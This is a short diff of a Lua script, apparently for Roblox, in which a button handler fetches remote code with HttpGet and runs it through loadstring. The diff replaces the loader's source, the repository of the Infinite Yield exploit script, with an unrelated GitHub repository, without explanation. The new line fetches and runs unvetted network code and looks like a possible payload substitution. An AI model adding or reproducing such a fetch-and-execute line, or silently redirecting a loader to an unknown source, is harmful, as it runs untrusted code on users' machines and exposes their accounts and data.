@@ -48,7 +48,7 @@ NewVer.TextWrapped = true
 
 NewVer.MouseButton1Down:Connect(function()
 	if Main_ScreenGui then
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/XCX443/adwdad/refs/heads/main/new'))()
 		Main_ScreenGui:Destroy()
 	end
 end)
